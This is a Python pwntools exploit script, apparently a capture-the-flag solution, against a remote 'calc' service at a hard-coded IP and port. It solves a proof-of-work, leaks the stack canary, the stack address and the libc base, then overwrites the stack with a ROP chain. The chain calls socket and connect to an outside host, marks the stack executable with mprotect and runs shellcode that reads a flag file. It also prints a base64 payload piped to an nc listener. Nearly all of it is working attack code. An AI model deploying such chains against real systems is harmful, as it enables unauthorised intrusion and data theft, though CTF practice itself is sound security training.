#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"
from pwn import *
from ctypes import c_uint32
from base64 import b64encode
from itertools import product
from hashlib import sha256
from time import sleep

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global
EXEC = 0x56555000

io = remote("47.89.11.82",10010)
#io = process("./calc/calc", env = {"LD_PRELOAD" : "./libc.so.6"})
#io = process("./calc")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (EXEC+addr))

chs = string.ascii_letters+string.digits

def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

proof()

io.recvuntil('          ####      #    #')

io.sendline("+")
sleep(0.5)
io.recvuntil("= ")
canary = c_uint32(int(io.recvline()[:-1])-1).value
log.info("canary 0x%08x" % canary)

io.sendline("*0")
sleep(0.5)
io.sendline("**0")
sleep(0.5)
io.sendline("***0")
sleep(0.5)
io.sendline("****0")
sleep(0.5)
io.sendline("+++++0")
sleep(0.5)
io.recvuntil('+++++0 = ')
esp = c_uint32(int(io.recvline()[:-1])).value
log.info("esp 0x%08x" % esp)

io.sendline("*****0")
sleep(0.5)
io.sendline("******0")
sleep(0.5)
io.sendline("+++++++0")
sleep(0.5)
io.recvuntil('+++++++0 = ')
libc_base = c_uint32(int(io.recvline()[:-1])).value-0x1b2000
log.info("libc_base 0x%08x" % libc_base)


io.sendline("*"*0x17+"0")

sum = 0
def writemem(idx, val):

    payload = "*"*(idx+1)+"0"
    assert(len(payload)<0x18)
    io.sendline(payload)
    sleep(0.5)

    payload = "+"*(idx+1)+"%d"%(c_uint32(val).value)
    assert(len(payload)<0x18)
    io.sendline(payload)
    sleep(0.5)

writemem(12, esp)
writemem(11, libc_base+0x000177db) # pop edi ; ret
writemem(10, libc_base+0x5f3e0) # gets
writemem(9, 0x10)
writemem(8, esp-0x114)
writemem(7, 0x0)
writemem(6, libc_base+0x000179a5) # pop esi ; pop edi ; pop ebp ; ret
writemem(5, libc_base+0xe8060) # ret connect
writemem(4, esp-0x2c)
writemem(3, libc_base+0x00018ea7)
writemem(2, esp-0x50)
writemem(1, libc_base+0x0002406e)
writemem(0, canary)

def writemem_by_mum(idx, val):
    payload = '0(' * (idx - 1) + str(val)
    assert len(payload) < 0x18
    io.sendline(payload)
    sleep(0.5)

writemem_by_mum(7, libc_base+0xe85d0) # socket
writemem_by_mum(6, libc_base+0xa0327) # 0x000a0327 : pop eax ; pop edi ; pop esi ; ret
writemem_by_mum(5, 0x2) # 0x24
writemem_by_mum(4, 0x1) # 0x20
writemem_by_mum(3, 0x0) # 0x1c
writemem_by_mum(2, libc_base+0x11761a) # 0x18 0x0011761a : add esp, 0x10 ; pop ebx ; pop esi ; ret
writemem_by_mum(1, 0xdeadbee1)

#attach(0xED7)

# local
#sockaddr = ''
#sockaddr += p32(0x5c110002)
#sockaddr += p32(0x0)
#sockaddr += p32(0xffc999a4)
#sockaddr += p32(0xffc999ac)
#sockaddr += p32(0x0)

# server
#sockaddr = ''
#sockaddr += p32(0x5c110002)
#sockaddr += p32(0x43b9c78b)
#sockaddr += p32(0xffffd5b4)
#sockaddr += p32(0xffffd5bc)

# xdd
sockaddr  = ''
sockaddr += p32(0x21300002)
sockaddr += p32(0x950778ca)
sockaddr += p32(0xffc9c454)
sockaddr += p32(0xffc9c45c)
sockaddr += p32(0x0)
#io.sendline(sockaddr)

shellcode = asm(pwnlib.shellcraft.open('/home/pwn/flagggggggggggggggg9gggggggggg9ggggggg9ggggggggggg99ggg').rstrip())
shellcode += asm(shellcraft.read(1, esp, 0x40).rstrip())
shellcode += asm(shellcraft.write(0, esp, 0x40).rstrip())

rop  = ''
rop += p32(libc_base+0x000e2da0) # libc_mprotect
rop += p32(libc_base+0x000179a5) # pop esi ; pop edi ; pop ebp ; ret
rop += p32(esp&0xfffff000)
rop += p32(0x2000)
rop += p32(0x7)
rop += p32(libc_base+0x00002aa9) # jmp esp
rop += shellcode

print '\necho '+b64encode(rop) + '| base64 -d | nc -lvp 12321'

raw_input()
sleep(0.5)
io.sendline(sockaddr)

io.interactive()
